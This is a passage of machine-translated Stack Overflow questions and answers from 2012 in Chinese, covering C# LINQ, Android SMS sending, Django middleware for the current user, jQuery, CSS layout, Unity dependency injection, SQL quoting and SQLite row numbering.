您可以使用[IEnumerable.Except](http://msdn.microsoft.com/en-us/library/system.linq.enumerable.except.aspx)。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2012-06-12T07:22:31.493

我认为这是解决这个问题的最短方法

```
foreach (string com in com2 )
{
    if (!com1.Contains(com))
    {
        MessageBox.Show(com);
    }
} 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-06-12T06:28:49.937

如果您想要一个列表中的所有内容但不是两个，在一个表达式中，您可以使用[`Union`](http://msdn.microsoft.com/en-us/library/system.linq.enumerable.union),*和*：[`Intersect`](http://msdn.microsoft.com/en-us/library/system.linq.enumerable.intersect) *[`Except`](http://msdn.microsoft.com/en-us/library/bb300779)*

 *```
var inOnlyOneArray = array1.Union(array2).Except(array1.Intersect(array2)); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-06-12T06:31:43.243

正如其他人已经说过的那样，`Except`扩展方法绝对是要走的路。但是，我要补充一点，看起来您可能希望对比较的方式进行一些控制；如果“COM8”指的是串行端口标识符，那么您需要执行不区分大小写的比较：

```
var result = com2.Except(com1, StringComparer.OrdinalIgnoreCase); 
```*

# android - 制作带有关键字的群发短信应用程序

> ID：10991453
> 
> 赞同：-1
> 
> 时间：2012-06-12T06:22:08.500
> 
> 标签：android, sms

我在一个 youtube 频道上尝试关注 200 节关于 Android 开发的系列课程，而我首先想知道的是我的应用创意是否可行。

我想制作一个应用程序，用于在任何给定时间向可能少于 100 人的小组发送大量短信。

我不需要任何短代码，实际上我想使用我的 GV#，因为那是免费的长代码。

现在我所做的是我使用 GV 和 Gmail 解决方法（如果你不知道那是什么，你可以问我或谷歌它）但由于订阅者的波动，这是一个漫长而乏味的过程。

**我的问题是**：

我也需要关键字功能，GV 没有提供，这让我考虑制作一个应用程序。我还想让人们通过关键字自动添加到列表中。我将每月从我的 AT&T 三星 Galaxy S II 发送 10 到 20 次左右。

我显然变得非常绝望......任何帮助，问题或建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-07T05:34:44.580

市场上有一款名为 SMS KeyWords 的应用程序。听起来像你在找什么。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:45:50.400

```
 SmsManager sm = SmsManager.getDefault();
  String number = "8001234567";
  sm.sendTextMessage(number, null, "Enter text message here", null, null); 
```

并记住在清单中将您的权限设置为

```
 android:name="android.permission.SEND_SMS" 
```

这应该让您朝着正确的方向开始。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T11:42:17.503

您不一定需要 Android 应用程序来发送 SMS。您也可以使用一些基于 Web 的 API。

Twilio、Tropo 和 MediaBurst 等一些公司提供基于 Web 的 API，您可以从 Web 服务或 Android 应用程序调用这些 API。

还有一些运营商提供基于 Web 的 API，用于使用基于 Web 的 API（包括 Bluevia）通过他们的网络发送 SMS（参见[https://bluevia.com](https://bluevia.com)）。

因此，如果这对您来说更容易，您也可以编写一个 Web 服务。

# url - 服务 URL 不再有效 - 似乎已更改

> ID：10991455
> 
> 赞同：1
> 
> 时间：2012-06-12T06:22:09.183
> 
> 标签：url, service, google-apps-script

作为服务发布的基于电子表格的应用程序具有以下形式的 URL：https://spreadsheets3.google.com/a/macros/my-domain.com/exec?service=AKfycbwly1SYZhdnPOoKfkH_xB7oMKDeYifYm8M

今天，这些 URL 导致出现带有 Google Drive 徽标的错误页面和消息“Google Docs 遇到服务器错误。如果重新加载页面没有帮助，请联系我们。”。如果您查看标头，它们会出现 HTTP 500 错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T06:22:10.040

Google 似乎已更改其已发布脚本的 URL 方案。我找不到任何建议或发行说明。它们现在的形式是：https://docs.google.com/a/macros/my-domain.com/s/AKfycbzvopSddGc3E4KL_nLmxR2fgOXLxNvmliBgXkiJ/exec

要获取新 URL，请进入您的脚本 > 发布为服务...，然后从 URL 框中复制它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T12:57:08.373

我在问题跟踪器中提出了这个问题：[http ://code.google.com/p/google-apps-script-issues/issues/detail?id=1399](http://code.google.com/p/google-apps-script-issues/issues/detail?id=1399)

如果您不想公开分享，请在问题跟踪器中提供所需信息（完整 URL），通过电子邮件直接发送给我。

# jquery - 使用 jquery 删除重复的文本

> ID：10991459
> 
> 赞同：2
> 
> 时间：2012-06-12T06:22:33.787
> 
> 标签：jquery

说我有以下

```
 <h3>This is my heading</h3>
 <p>This is my headingAnd this is part of a paragraph</p> 
```

我想结束以下

```
 <h3>This is my heading</h3>
 <p>And this is part of a paragraph...</p> 
```

我找到了这段代码

```
 $(function() {
   var seen = {};
    $('p, h3').each(function() {
    var txt = $(this).text();
     if (seen[txt])
     $(this).remove();
   else
     seen[txt] = true;
  });
}); 
```

但是因为段落中加入了两个单词，所以它不起作用。数据是从 rss 提要中动态提取的。

提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T06:29:05.303

如果您的 DOM 结构保持如上所述，那么以下内容将为您工作：

```
$('p').text(function(index, oldText) {
  return oldText.replace($(this).prev('h1').text(), '');
}); 
```

**[演示](http://jsfiddle.net/hrAyx/)**

### 根据你的评论

```
<div id="youtube">
    <section>
        <h3>Launch of the Active Living impact checklist</h3>
        <p>Launch of the Active Living impact checklistFrom test</p>
        <a target="_blank" href="#"> watch video</a> <br>
    </section>
    <section>
        <h3>Enterprise Computing Conference</h3>
        <p>Enterprise Computing ConferenceWorld leaders in enterprise computing attended a two</p>
        <a target="_blank" href="#"> watch video</a> <br>
    </section>
</div>

$('p').text(function(index, oldText) {
  return oldText.replace($(this).prev('h3').text(), '');
}); 
```

**[演示](http://jsfiddle.net/4vKsg/1/)**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:31:51.327

```
var header = ​$('h1').​​​​text();
var body = $('p').text();

if (body.indexOf(header) >= 0) {
    $('p').text(body.replace(header, ''));
} 
```

[演示](http://jsfiddle.net/eNSDJ/)

# python - Django：在模型保存中获取当前用户

> ID：10991460
> 
> 赞同：57
> 
> 时间：2012-06-12T06:22:35.723
> 
> 标签：python, django, django-models

我想在models.py`request.user`的方法中获取当前登录的用户（） 。`save`我想检查用户的角色，看看它是否可以根据他的角色执行一些操作。

**模型.py**：

```
class TimeSheet(models.Model):
    check_in_time = models.TimeField()
    check_out_time = models.TimeField()

class Tasks(models.Model):
    time_sheet = models.ForeignKey(TimeSheet)
    project = models.ForeignKey(Project)
    start_time = models.TimeField()
    end_time = models.TimeField()

    def save(self, *args,**kwargs):
        project = SpentTime.objects.get(project__project__id = self.project.id)
        start = datetime.datetime.strptime(str(self.start_time), '%H:%M:%S')
        end = datetime.datetime.strptime(str(self.end_time), '%H:%M:%S')
        time = float("{0:.2f}".format((end - start).seconds/3600.0))

        if common.isDesigner(request.user):
            SpentTime.objects.filter(project__project__id = self.project.id).update(design = float(project.design) + time)

        if common.isDeveloper(request.user):
            SpentTime.objects.filter(project__project__id = self.project.id).update(develop = float(project.develop) + time)

        super(Tasks, self).save(*args, **kwargs) 
```

在这里，`Tasks`模型被用作模型中的内联`Timesheet`。我想检查当前登录用户的角色并根据用户的角色更新另一个模型。这里我需要`request.user`检查当前用户的角色。我没有使用任何表单或模板，而是完全使用 Django admin。是否有任何方法可以进入`request.user`该`save`方法或检查和更新 admin.py 中另一个模型中的值？

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2012-06-12T09:34:15.457

你可以从另一个角度解决这个问题。您应该重写 AdminSites 方法，而不是更改模型保存`save_model`方法。在那里，您将拥有请求对象，并且可以访问已登录的用户数据，正如您已经指出的那样。

查看文档的这一章：[Django ModelAdmin 文档 save_model](https://docs.djangoproject.com/en/dev/ref/contrib/admin/#django.contrib.admin.ModelAdmin.save_model)

* * *

## 回答 #2

> 赞同：26
> 
> 时间：2016-03-31T08:53:03.917

我找到了一种方法来做到这一点，但它涉及声明一个中间件。在您的应用程序中创建一个名为的文件`get_username.py`，其中包含以下内容：

```
from threading import current_thread

_requests = {}

def get_username():
    t = current_thread()
    if t not in _requests:
         return None
    return _requests[t]

class RequestMiddleware(object):
    def process_request(self, request):
        _requests[current_thread()] = request 
```

编辑您的`settings.py`并将其添加到`MIDDLEWARE_CLASSES`：

```
MIDDLEWARE_CLASSES = (
    ...
    'yourapp.get_username.RequestMiddleware',
) 
```

现在，在您的`save()`方法中，您可以像这样获取当前用户名：

```
from get_username import get_username

...

def save(self, *args, **kwargs):
    req = get_username()
    print "Your username is: %s" % (req.user) 
```

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2017-02-27T16:43:30.933

@nKn 提出的解决方案是一个很好的起点，但是当我今天尝试实施时，我遇到了两个问题：

1.  在当前 Django 版本中，作为普通对象创建的中间件不起作用。
2.  单元测试失败（因为它们通常在单线程中运行，所以如果第一个测试有 HTTP 请求而第二个没有，你的“请求”可能会停留在两个后续测试之间）。

这是我更新的中间件代码，它适用于 Django 1.10 并且不会破坏单元测试：

```
from threading import current_thread

from django.utils.deprecation import MiddlewareMixin

_requests = {}

def current_request():
    return _requests.get(current_thread().ident, None)

class RequestMiddleware(MiddlewareMixin):

    def process_request(self, request):
        _requests[current_thread().ident] = request

    def process_response(self, request, response):
        # when response is ready, request should be flushed
        _requests.pop(current_thread().ident, None)
        return response

    def process_exception(self, request, exception):
        # if an exception has happened, request should be flushed too
         _requests.pop(current_thread().ident, None) 
```

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2019-01-07T23:08:01.760

The correct way is to use `threading.local`, instead of using a dictionary with `threading.current_thread`, since it will lead to a memory leak, since the old values will stay there for as long the application is running:

```
import threading

request_local = threading.local()

def get_request():
    return getattr(request_local, 'request', None)

class RequestMiddleware():
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        request_local.request = request
        return self.get_response(request)

    def process_exception(self, request, exception):
        request_local.request = None

    def process_template_response(self, request, response):
        request_local.request = None
        return response 
```

If you want to access the user instead of the request, you can do `get_request().user`, or save the user instead of the request on `__call__`

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2012-11-03T01:45:21.047

我不认为 save_model 方法覆盖是最好的选择。例如，假设您想要保存用户信息或根据用户信息验证模型，并且 save() 不是来自视图或管理站点本身。

人们要问的是这样的结构：

```
def save(..)
    self.user = current_user() 
```

或者

```
def save(..)
    user = current_user()
    if user.group == 'XPTO':
        error('This user cannot edit this record') 
```

到目前为止我发现的最好的方法是：

[https://bitbucket.org/q/django-current-user/overview](https://bitbucket.org/q/django-current-user/overview)

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2019-10-02T15:49:20.400

您是否尝试过使用以下库：

[https://pypi.org/project/django-currentuser/](https://pypi.org/project/django-currentuser/)

网站上如何使用它的片段：

```
from django_currentuser.middleware import (get_current_user, get_current_authenticated_user)
# As model field:
from django_currentuser.db.models import CurrentUserField
class Foo(models.Model):
    created_by = CurrentUserField() 
```

# jquery - 在没有交叉的情况下配对几个 jQueryUI 可排序对象

> ID：10991463
> 
> 赞同：2
> 
> 时间：2012-06-12T06:22:54.153
> 
> 标签：jquery, jquery-ui, jquery-ui-sortable

我正在开发一种拖放重新排序小部件，用户可以将元素从一个可排序的（我们称之为左框）拖到另一个（右框）

这里的问题是，我将拥有多个这样的小部件。

我想要做的是将它们配对，以便一个小部件的 LEFT 框中的项目不能拖动到另一个小部件的 RIGHT 框中。

我目前的伪代码是：

```
<ul class = "left">
...
</ul>

<ul class = "right">
...
</ul>

$('.left').sortable
  connectWith: '.right' 
```

由于两个 UL 是兄弟姐妹，我尝试过类似的东西

```
$('.left').sortable
  connectWith: '+ .right' 
```

这不起作用，因为 sortable 的内部代码在尝试定位连接元素时不考虑当前元素。

我也尝试使用该`containment`选项指向两个 UL 的父级，但这也不起作用。

你会建议我做什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T09:49:54.987

解决了！

在所有 sortable 的 onReceive 回调中，我调用了这个方法：

```
checkPairing = (event, ui, el) ->
  firstParent = $(el).parent().get(0)
  secondParent = $(ui.sender).parent().get(0)
  $(ui.sender).sortable('cancel') unless firstParent == secondParent 
```

每当任何可排序对象发生接收事件时，获取两个可排序对象的父元素（DOM，而不是 jQuery 对象）并比较它们。如果他们确实是一对，他们将是平等的。如果没有，请取消活动。

我花了一些时间才弄清楚（1）您不能仅通过相等运算符比较两个 jQuery 对象，并且（2）a`return false`无济于事，您必须调用 cancel 方法。

配对按预期工作。

# sql-server - SQL Server 插入语法

> ID：10991467
> 
> 赞同：1
> 
> 时间：2012-06-12T06:23:33.900
> 
> 标签：sql-server, insert

我正在尝试将以下文本插入到表格单元格中，即`varchar(8000)`.

```
SELECT DISTINCT TOP 100 * 
FROM  
    (SELECT TOP 10000 * 
     FROM 
        (SELECT DISTINCT 
             rklient, nimi + ISNULL('(' + UPPER(oleknimi) + ')' ,'') AS nimi,
             mkood, kommentaar, regkood,
             ISNULL(aadress + ' ','') AS aadress, 
             naitatel AS telefon, NULL AS lepingutelefon, 
             faks, email, www, NULL AS sisu, iprowid, 
             varvikood, klient, saitrank AS rank, emaid, 'F' AS typ, 
             infobaas, x, y, ISNULL(lahtiolekuaeg,'none') as lahtiolekuaeg, 
             lahtikomment, NULL AS koiksynid, paigutus, nimeviide, kupong  
         FROM 
             table_name WHERE reanr = '10') Tulemus) e 
WHERE 
    nimeviide IS NULL  
ORDER BY 
    rank DESC, iprowid 
```

它给了我不正确的语法。我想是因为这个：`'`

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T06:30:37.363

`'`您可以通过简单地将字符加倍来引用该字符`''`。

例子：

```
 SELECT 'This is q single quote '''; 
```

# javascript - 在 Rails 的条件下从视图中调用引导模式

> ID：10991468
> 
> 赞同：2
> 
> 时间：2012-06-12T06:23:35.820
> 
> 标签：javascript, ruby-on-rails, twitter-bootstrap, modal-dialog, registration

首先，我解释一下我想要做什么：当用户在 sign_in 或 sign_up 弹出表单（引导模式）中输入错误的值时，我应该调用 $("#sign_up").show(); 或 $("#login").show();.

所以，我需要从视图中调用 js：我看到它是这样的：

```
 <%= devise_error_messages! //here call $("#sign_up").show(); %> 
```

或其他方式，但几乎相同，但没有 devise_error

```
 <% if @user.errors.any? %>
<%"eval('$("#sign_up").show();')"%> 
```

或者应该如何...

我是否应该重写我的注册？

请纠正我，我不知道该怎么做。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T09:00:47.037

如果我理解你不需要调用模态的问题。只是不要在页面加载后隐藏它。也就是说，必须有这样的东西：

```
<% if @user.errors.any? %>
  <div id="myModal" class="modal">
<% else %>
  <div id="myModal" class="modal hide">
<% end %>
    #your modal here
  </div> 
```

但总的来说，我建议使用 Ajax 并`respond`在你的模式中呈现表单`js`：`create`

```
#create action
respond_to do |format|
  if @user.save
    ...
  else
    ...
    format.js { render action: "new" }
  end

#new.js.erb
$('#myModal').html("<%= j render 'form' %>"); 
```

# facebook - Facebook 为我网站的每个页面点赞 - 单击“点赞”应该共享该特定的完整网址，而不仅仅是网站名称

> ID：10991471
> 
> 赞同：1
> 
> 时间：2012-06-12T06:23:54.257
> 
> 标签：facebook, facebook-like

我想将 facebook like 按钮集成到我的网站中。我的网站有多个页面，包含多个产品。目前，当用户喜欢我的网站时，只有域名被分享，如 "http://domainname.com" 。但是，我想要的是，如果 url 是[http://domainname.com/products/5](http://domainname.com/products/5)那么，如果我在该页面中点击喜欢，在 facebook 墙上，[http://domainname.com/products/5](http://domainname.com/products/5)应该是共享 . 我该怎么办？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T06:26:18.613

您需要在页面标题中使用 OG 元标记，例如，

```
<meta property="og:url" content="${someURL}"/> 
```

someURL 是您的动态 URL。

请阅读本[教程](https://developers.facebook.com/docs/opengraph/tutorial/)以获取更多详细信息

# javascript - 启动带参数的函数

> ID：10991475
> 
> 赞同：2
> 
> 时间：2012-06-12T06:24:22.650
> 
> 标签：javascript, google-apps-script

我试图让我在计时器上运行的一个函数调用另一个需要参数的函数，我的代码是[本教程](https://developers.google.com/apps-script/articles/gmail_filter_sms)的一个非常轻微的修改版本我已经删除了 sms 调用并且以下代码有效

```
function testFunction() {
   var label = GmailApp.getUserLabelByName('GApps/Test');
   var emails = label.getThreads();
   var now = new Date().getTime();
   for(i in emails){
      CalendarApp.createEvent('You got an Email!', new Date(now+60000), new Date(now+60000));
   }
} 
```

我在 gmail 中设置了一个过滤器，当我从某个电子邮件地址收到一封电子邮件时，它会在我从某个电子邮件地址收到的任何电子邮件上应用子标签测试（来自 GApps）标签系列，当我收到来自该地址的电子邮件并且它获取标签测试上面的代码时在我的 google 日历中添加一个条目，其中包含活动名称 You got 和 Email！从当前时间开始和结束一分钟

```
function gmail2cal(labLoc, event) {
   var label = GmailApp.getUserLabelByName(labLoc);
   var emails = label.getThreads();
   var now = new Date().getTime();
   for(i in emails){
      CalendarApp.createEvent(event,  new Date(now+60000), new Date(now+60000));
   }
} 
```

现在这里是相同的代码，用字符串替换了变量，假设这个函数是用两个参数调用的，它们的值与前面的代码块相同，它应该功能相同

```
function launcher(){
   gmail2cal('GApps/Test','You got an Email!');
} 
```

但是当我在 Google Apps 脚本编辑器中使用运行功能按钮时，功能 gmail2cal 不起作用，我不明白为什么

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T07:57:15.010

Google Apps 脚本编辑器中的运行命令不会将任何参数传递给您的函数。因此，如果您执行该函数`gmail2cal`，它会在没有任何参数的情况下被调用，这会导致`labLoc`和`event`评估为`undefined`. 可能`GmailApp.getUserLabelByName(undefined);`什么都不返回，因此你的函数什么都不做。

在这种情况下，您可能希望`launcher`从“运行”菜单执行该函数，该函数将`gmail2cal`使用它需要的 2 个参数执行。

# css - 如何阻止这些 div 重叠？

> ID：10991478
> 
> 赞同：9
> 
> 时间：2012-06-12T06:24:34.820
> 
> 标签：css, html

我在一个内容 div 中有三个 div。

容器宽度 70%。其中我有 -Left，宽度为 20%。-内容，宽度 60%。- 对，宽度 20%。

我希望容器占据页面宽度的 70%，而内部（左侧、内容和右侧）占据容器 div 的 20%、60% 和 20%。

我在这里尝试过其他问题，我尝试过谷歌，但似乎找不到正确的答案。请帮我阻止它们重叠。

![最大化浏览器](../Images/1c3163b2d2b15124d4e7ae556ebe1542.png)

但是当我重新调整浏览器的大小时，div 会重叠。像这样：

![调整大小的浏览器](../Images/43e60062bdf6bf4ef77764c4e85447ea.png)

这是相关的CSS代码：

```
#container{
    width: 70%;
}
#left {
    float: left;
    width: 20%;
    min-width: 200px;
}
#content {
    float: left;
    width: 60%;
    min-width: 600px;
}
#right {
    float: right;
    width: 20%;
    min-width: 200px;
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-12T06:34:13.070

只需`min-width`从您的 CSS 中删除！并给`min-width`容器`margin: auto`以使其居中。

试试这个 CSS：

```
#container{
    width: 70%;
    min-width: 1000px;
    margin: auto;
}
#left {
    float: left;
    width: 20%;
}
#content {
    float: left;
    width: 60%;
}
#right {
    float: right;
    width: 20%;
} 
```

在这里查看小提琴：http: [//jsfiddle.net/UaqU7/2/](http://jsfiddle.net/UaqU7/2/)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-12T06:29:56.597

取出 min-width CSS。

一旦窗口宽度低于某个大小，这些元素就别无选择，只能重叠。假设你的窗口是 1000px；那么容器将是 700px。但是使用最小宽度，容器中的 div 已经是 1000px，溢出容器。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-12T06:35:00.903

而不是给子 DIV 的**最小宽度**，你可以给它`#container`。像这样写：

```
#container{
    width: 70%;
    min-width:1000px;
}
#left {
    float: left;
    width: 20%;
}
#content {
    float: left;
    width: 60%;
}
#right {
    float: right;
    width: 20%;
} 
```

检查这个[http://jsfiddle.net/yLVsb/](http://jsfiddle.net/yLVsb/)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-06-12T06:32:55.533

你需要`min-width`从你的 CSS 中取出。

当页面变小时，它会`min-width`阻止它进一步缩小。从而造成重叠。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-06-12T06:57:17.653

这是小提琴它的工作正常[http://jsfiddle.net/r42hH/2/](http://jsfiddle.net/r42hH/2/)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-06-12T06:34:22.600

给你，如果你想要一个最小宽度，把它设置在容器上

[http://jsfiddle.net/VBSYu/1/](http://jsfiddle.net/VBSYu/1/)

```
#container{
    width: 70%;
    min-width: 1000px;
}
#left {
     float: left;
     width: 20%;
}
#content {
    float: left;
    width: 60%;
}
#right {
    float: right;
    width: 20%;
}​ 
```

# android - Android：如何在单个 xml 文件中编写多个选择器

> ID：10991480
> 
> 赞同：11
> 
> 时间：2012-06-12T06:24:52.280
> 
> 标签：android, selector, imagebutton

在我的应用程序中，我有 4 个`ImageButtons`，每个 ImageButton 根据它们的状态有不同的源图像。因此为每个按钮维护 4 个单独的 xml 文件。

有没有办法将所有选择器写入一个 xml 文件？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-12T06:46:01.297

不是不可能：

文档说：StateListDrawable 是一个用 XML 定义的可绘制对象，它使用几个不同的图像来表示相同的图形，具体取决于对象的状态。

注意这里：**相同的图形**

src：[可绘制资源](http://developer.android.com/guide/topics/resources/drawable-resource.html)

# ruby - 自动删除字段

> ID：10991483
> 
> 赞同：1
> 
> 时间：2012-06-12T06:25:09.140
> 
> 标签：ruby, mongodb

我是 MongoDB 的新手。所以请指导我解决这个问题。我有一个文档集合，想从集合中删除不必要的字段。有没有自动化的方法？我知道我可以使用**$unset**但似乎如果我想删除许多字段，那么我必须对每个字段重复此操作，对吗？我发现我可以根据这个使用 ruby​​ 来做到这[一点](https://stackoverflow.com/questions/6314139/delete-document-from-mongodb)，但是如果不是删除所有字段而是删除其中一些字段呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T06:56:25.930

有了`$unset`您，您将能够一次删除（任意）许多字段。与多重更新一起，您将获得类似于自动化方法的东西。所以只删除一些字段让我们考虑这个示例文档：`{_id:OID, a: { b: 2, c: 3}, d : [1,2]}`你可以使用这个：`$unset : {"a.b" : 1, d : 1}`删除a中的嵌套元素b，以及数组d。

如果您只想删除数组的某些项目，我相信您必须使用[位置运算符](http://www.mongodb.org/display/DOCS/Updating#Updating-The%24positionaloperator)，但我没有使用它。

# .net - WebView 控件是否支持设计模式？

> ID：10991487
> 
> 赞同：1
> 
> 时间：2012-06-12T06:25:20.077
> 
> 标签：.net, winforms, windows-8, .net-4.5, microsoft-metro

我发现，WebView 控件（适用于 Windows 8 Metro 风格的应用程序）与 Windows 窗体的 Web 浏览器控件相同。我可以打开这个 Web 视图控件的 'DesignMode' = ON 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T06:51:56.393

您不能在 Metro 应用程序中使用 MSHTML.dll，并且 WebView 不支持 HTML 编辑。

所以剩下的就是自己建造或找到为你建造的人。目前我不知道有人为 Metro 应用程序构建了 HTML 编辑器。

一种解决方法可能是[尝试在 HTML5/javascript Metro App 中使用 TinyMCE](http://win8review.com/2011/10/windows-8-metro-style-app-developer-journal/)。这篇文章的作者已经尝试过了，但还没有成功。

# c# - Unity：无法从不同的程序集中注册类型

> ID：10991488
> 
> 赞同：7
> 
> 时间：2012-06-12T06:25:20.197
> 
> 标签：c#, asp.net-mvc, dependency-injection, unity-container

我正在尝试`Dependency injection`在我的 MVC 应用程序中实现。我正在使用`Unity.Mvc3.dll`IoC。我只是想知道 Unity 如何无法从另一个程序集中注册类型。这是代码：

```
protected void Application_Start()
{
    AreaRegistration.RegisterAllAreas();

    RegisterGlobalFilters(GlobalFilters.Filters);
    RegisterRoutes(RouteTable.Routes);

    var container = new UnityContainer();

    // ok: register type from this assembly
    container.RegisterType<IMessages, Messages>();

    // fail: register type from another assembly (service reference)
    container.RegisterType<IPlayerService, PlayerService>();

    DependencyResolver.SetResolver(new UnityDependencyResolver(container));
}

public class UnityDependencyResolver : IDependencyResolver
{
    private readonly IUnityContainer _container;

    public UnityDependencyResolver(IUnityContainer container)
    {
        this._container = container;
    }

    public object GetService(Type serviceType)
    {
        try
        {
            return _container.Resolve(serviceType);
        }
        catch (Exception ex)
        {
            throw ex;
        }
    }

    public IEnumerable<object> GetServices(Type serviceType)
    {
        try
        {
            return _container.ResolveAll(serviceType);
        }
        catch (Exception ex)
        {
            throw ex;
        }
    }
} 
```

MVC 控制器中的用法：

```
[Dependency]
public IPlayerService PlayerService { get; set; }

[Dependency]
public IMessages Messages { get; set; }

public ActionResult Index()
{
    PlayerMessageViewModel vm = new PlayerMessageViewModel();
    vm.Messages = Messages; // success!
    vm.Players = PlayerService.Get(); // fail: null reference exception :PlayerService

    return View(vm);
} 
```

`PlayerService`消息正常时始终为空。

这是`PlayerService`课程

```
public class PlayerService : IPlayerService
{
    private readonly MyDbEntities _dbContext;

    public PlayerService()
    {
        _dbContext = new MyDbEntities();
    }

    public PlayerService(MyDbEntities dbContext)
    {
        _dbContext = dbContext;
    }

    public IQueryable<Player> Get()
    {
        return _dbContext.Players.AsQueryable();
    }
} 
```

这是完整的错误信息

> 依赖项解析失败，type = "System.Web.Mvc.IControllerFactory"，name = "(none)"。
> 异常发生时：解决时。
> 异常是： InvalidOperationException - 当前类型 System.Web.Mvc.IControllerFactory 是一个接口，无法构造。您是否缺少类型映射？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-12T06:28:16.550

您正在隐藏所有异常并`catch { return null; }`尝试将其删除，并查看在解决时抛出了什么异常。我认为构造函数中抛出了异常`PlayerService`。

**编辑：**

来自[http://mvchosting.asphostcentral.com/post/ASPNET-MVC-3-Hosting-Problem-in-implementing-IControllerActivator-in-ASPNET-MVC-3.aspx](http://mvchosting.asphostcentral.com/post/ASPNET-MVC-3-Hosting-Problem-in-implementing-IControllerActivator-in-ASPNET-MVC-3.aspx)

> 当一个 MVC 应用程序第一次启动时，依赖解析器会按以下顺序调用以下类型：
> 
> *   控制器工厂
> *   控制器激活器
> *   家庭控制器
> 
> 如果您没有实现解析器以在未注册类型时返回 null，那么您最终可能会看到类似于以下内容的错误：
> 
> 当前类型 System.Web.Mvc.IControllerFactory 是接口，无法构造

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-06-12T08:12:21.427

默认情况下，统一选择具有最多参数的构造函数，所以我认为它将尝试使用第二个构造函数和 dbContext 参数，它无法解析。如果您使用属性 [InjectionConstructor] 标记默认构造函数，那么希望这将解决您的问题

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-12T08:17:55.077

你违反了 的合同`IDependencyResolver`。它应该返回`null`无法解析的类型。Unity 的问题在于它试图构建它可以找到的所有类，无论它们是否在容器中注册。

因此无法在某处建立一个类。

`Unity.Mvc3`nuget中还有一个可用的软件包。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-01-25T12:14:01.000

当前类型**(EX-DI.IBLL.IEmployee)**是一个接口，无法构造。您是否缺少类型映射？

**Ans -**只需`Unity.config.cs`添加以下内容

```
public static class UnityConfig
    {
        public static void RegisterComponents()
        {
            var container = new UnityContainer();

            // register all your components with the container here
            // it is NOT necessary to register your controllers

            **container.RegisterType<IEmployee,EmployeeManager>();**
//this could be your interface and the class implementing the interface.

            DependencyResolver.SetResolver(new UnityDependencyResolver(container));
        }
    } 
```

# javascript - 使用 JavaScript 在页面正文中显示当前页面的哈希/锚点

> ID：10991497
> 
> 赞同：2
> 
> 时间：2012-06-12T06:26:39.240
> 
> 标签：javascript, anchor

假设用户访问页面[http://somedomain.com/path/file.html#foo](http://somedomain.com/path/file.html#foo)，我想使用 JavaScript 在页面某处显示如下文本：

```
 → foo 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T06:28:43.917

1.  用于`window.location.hash`获取锚点的名称。

    ```
    var anchorName = window.location.hash; 
    ```

2.  创建一个文本节点以显示您想要的内容：

    ```
    var path = document.createTextNode("→ " + anchorName); 
    ```

3.  将其添加到 Dom：

    ```
    document.getElementById(idOfContainerYouWantToEdit).appendChild(path); 
    ```

# sqlite - Sqlite 中的 ROWNumber

> ID：10991499
> 
> 赞同：5
> 
> 时间：2012-06-12T06:27:04.377
> 
> 标签：sqlite, select

在 SQL Server2005 中，Row_number() 函数用于检索结果集分区内行的序号，每个分区的第一行从 1 开始。这在通过 Table 中的大量记录实现分页时非常有用。SQLite 中是否有与此类似的功能。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-23T04:31:26.040

不会。通常你会用自己的代码来处理这些细节。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-01T02:46:13.603

您可以使用类似于以下格式的代码模拟在 ROW_NUMBER() 函数中完成的原始编号。

```
CREATE TABLE Temp.Output AS
SELECT *
FROM  (
    SELECT 10 AS ID,'Darren' AS Name
    UNION ALL
    SELECT 20,'Roger'
    UNION ALL
    SELECT 30,'Emil'
    UNION ALL
    SELECT 40,'Doug'
    UNION ALL
    SELECT 50,'Martin'
)
ORDER BY Name ASC
;
SELECT ROWID AS ROWNUMBER, ID, Name
FROM Temp.Output
;
DROP TABLE Temp.Output
; 
```

它不支持对结果进行分组的“PARTITION BY”（但您可以使用一些额外的 SQL）。

# reporting-services - SSRS 2008 R2-无法创建数据驱动订阅

> ID：10991501
> 
> 赞同：3
> 
> 时间：2012-06-12T06:27:31.457
> 
> 标签：reporting-services

尝试为报告创建数据驱动订阅时出现以下错误：

> 无法创建数据驱动订阅，因为未存储用于运行报表的凭据、报表使用用户定义的参数值，或者如果链接报表，则链接不再有效。

![错误截图](../Images/372b513272caef514d4201701950b19f.png)

正如给出的那样，可能有三件事会导致这个问题。在我的报告中：

